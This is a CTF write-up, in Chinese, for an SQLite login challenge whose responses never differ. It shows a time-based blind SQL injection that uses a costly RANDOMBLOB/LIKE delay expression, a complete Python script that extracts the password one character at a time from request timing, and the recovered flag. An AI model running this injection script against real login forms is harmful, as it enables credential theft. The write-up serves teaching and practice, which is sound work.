# SQLi Trainer 2

## 题目简述

登录接口仍把输入拼接进 SQLite，但无论查询结果如何都返回 `Login failed!`。flag 被存为 `user` 的密码，目标是利用 SQLite 的昂贵表达式构造时间型盲注，逐字符恢复密码。

## 解题过程

虽然响应正文不区分真假，数据库仍会执行注入条件。官方 solver 用如下表达式制造明显延迟：

```sql
100=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(400000000/2))))
```

把它放在只于前缀匹配成功时才求值的 `AND` 右侧。若猜测正确，SQLite 生成并处理大块随机数据，请求显著变慢；猜错则短路快速返回：

```python
import time
import requests

base_url = input("题目根地址：").rstrip("/")
alphabet = "01357etoanihsrdluc24689gwyfmbkvjxqzp{}_"
flag = ""
delay = "100=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(400000000/2))))"

while not flag.endswith("}"):
    for ch in alphabet:
        probe = flag + ch
        username = f"' OR (pass LIKE '{probe}%' AND {delay});-- "
        start = time.perf_counter()
        requests.post(f"{base_url}/login", data={"username": username, "password": ""})
        if time.perf_counter() - start > 1.0:
            flag = probe
            break
```

逐字符结果为：

```text
grey{5l33p_15_1mp0r74n7}
```

## 方法总结

隐藏错误和固定响应无法消除 SQL 注入，只会迫使攻击者换用侧信道。时间盲注依赖条件短路与可观测延迟；实际环境应多次采样并使用相对阈值，以降低网络抖动误判。
